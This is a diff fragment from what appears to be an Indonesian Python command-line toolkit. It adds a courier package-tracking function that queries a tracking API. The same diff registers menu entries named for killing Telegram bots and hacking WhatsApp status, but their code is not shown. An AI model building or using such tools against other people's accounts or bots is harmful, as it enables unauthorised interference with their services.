+        "10": {"name": "PCP Express", "code": "pcp"},
+        "11": {"name": "Royal Express", "code": "royal"},
+        "12": {"name": "First Logistics", "code": "first"},
+        "13": {"name": "ID Express", "code": "ids"},
+        "14": {"name": "Shopee Express", "code": "shopee"},
+        "15": {"name": "KGX Express", "code": "kgx"},
+        "16": {"name": "SAP Express", "code": "sap"},
+        "17": {"name": "Indah Cargo", "code": "indah"},
+        "18": {"name": "Dakota Cargo", "code": "dakota"},
+        "19": {"name": "Ant Cargo", "code": "ant"},
+        "20": {"name": "Next Logistics", "code": "next"},
+        "21": {"name": "GTL", "code": "gtl"},
+        "22": {"name": "Tokopedia Courier", "code": "tokopedia"},
+    }
+    
+    print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
+    print(f"{W}│ {W}[ {G}!!{W} ] Pilih kurir {R}:{N}")
+    
+    items = list(kurir_list.items())
+    for i in range(0, len(items), 2):
+        left = items[i]
+        right = items[i+1] if i+1 < len(items) else None
+        if right:
+            print(f"{W}│ [ {G}{left[0]}{W} ] {left[1]['name']:<20}  [ {G}{right[0]}{W} ] {right[1]['name']}")
+        else:
+            print(f"{W}│ [ {G}{left[0]}{W} ] {left[1]['name']}")
+    
+    print(f"{W}│ [ {R}0{W} ] Kembali ke Mikasa")
+    print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
+    
+    try:
+        pilih = input(f"{U}❯❯❯ {W}Pilih Kurir {G}❯{N} ")
+        if pilih == "0":
+            return
+        if pilih not in kurir_list:
+            print(f"{W}[ {R}??{W} ] Pilihan tidak valid!{N}")
+            time.sleep(1)
+            return
+        courier = kurir_list[pilih]['code']
+        courier_name = kurir_list[pilih]['name']
+    except:
+        print(f"{W}[ {R}??{W} ] Masukkan angka!{N}")
+        time.sleep(1)
+        return
+    
+    print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
+    print(f"{W}│ Masukkan {G}nomor resi")
+    print(f"{W}│ Contoh {R}:{W} JNE1234567890")
+    print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
+    
+    resi = input(f"{U}❯❯❯ {W}Checker Resi {G}❯{N} ").strip()
+    
+    if not resi:
+        print(f"{W}[ {R}??{W} ] Resi tidak boleh kosong!{N}")
+        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
+        return
+    
+    def load_bar_resi(stop_event):
+        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
+        RESET = '\x1b[0m'
+        length = 15
+        color_index = 0
+        while not stop_event.is_set():
+            for i in range(length + 1):
+                if stop_event.is_set():
+                    break
+                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
+                empty = '□' * (length - i)
+                sys.stdout.write(f'\r [ {G}✦{W} ] Mencari Resi [[{filled_color}{empty}{W}]]')
+                sys.stdout.flush()
+                time.sleep(0.05)
+                color_index += 1
+        sys.stdout.write('\r' + ' ' * 120 + '\r')
+        sys.stdout.flush()
+    
+    stop = threading.Event()
+    t = threading.Thread(target=load_bar_resi, args=(stop,))
+    t.daemon = True
+    t.start()
+    
+    try:
+        url = f'https://api.binderbyte.com/v1/track?api_key={API_KEY}&courier={courier}&awb={resi}'
+        resp = requests.get(url, timeout=15)
+        data = resp.json()
+        
+        stop.set()
+        t.join()
+        
+        if data.get('status') == 200:
+            result = data.get('data', {})
+            history = result.get('history', [])
+            
+            print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
+            print(f"{W}│ {G}✓{W} Succesfuly Status Paket{N}")
+            print(f"{W}├─────────────────────────────────────────────────────────────────┤")
+            print(f"{W}│ {W}Kurir     {R}: {G}{result.get('courier', 'N/A').upper()}{N}")
+            print(f"{W}│ {W}Resi      {R}: {G}{result.get('awb', 'N/A')}{N}")
+            print(f"{W}│ {W}Status    {R}: {G}{result.get('status', 'N/A')}{N}")
+            
+            if result.get('sender'):
+                print(f"{W}│ {W}Pengirim  {R}: {G}{result.get('sender', 'N/A')}{N}")
+            if result.get('receiver'):
+                print(f"{W}│ {W}Penerima  {R}: {G}{result.get('receiver', 'N/A')}{N}")
+            
+            if history:
+                print(f"{W}├─────────────────────────────────────────────────────────────────┤")
+                print(f"{W}│ {G}Riwayat:{N}")
+                for h in history[-10:]:
+                    date = h.get('date', '')
+                    desc = h.get('desc', '')
+                    print(f"{W}│ {G}{date:<20}{W}→ {G}{desc}{N}")
+            else:
+                print(f"{W}├─────────────────────────────────────────────────────────────────┤")
+                print(f"{W}│ {W}[ {R}??{W} ] Belum ada riwayat pengiriman{N}")
+            
+            print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
+        else:
+            print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
+            print(f"{W}│ {R}✗{W} Resi tidak ditemukan!{N}")
+            print(f"{W}├─────────────────────────────────────────────────────────────────┤")
+            print(f"{W}│ {W}Pesan {R}: {G}{data.get('message', 'Unknown error')}{N}")
+            print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
+            
+    except Exception as e:
+        stop.set()
+        t.join()
+        print(f"\n{R}✗ Error: {e}{N}")
+    
+    input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")
+
 def menu_utama():
     global clock_running, current_input
     
@@ -12716,6 +14251,13 @@ def menu_utama():
         "27": tool_web_recon,
         "28": lapor_bug,
         "29": tool_tambahan,
+        "30": tool_photo_to_url,
+        "31": tool_file_to_url,
+        "32": tool_bunuh_bot_telegram,
+        "33": tool_cek_bot_telegram,
+        "34": tool_link_shortener,
+        "35": tool_Hack_status_wa,
+        "36": tool_cek_resi,
     }
     
     try:
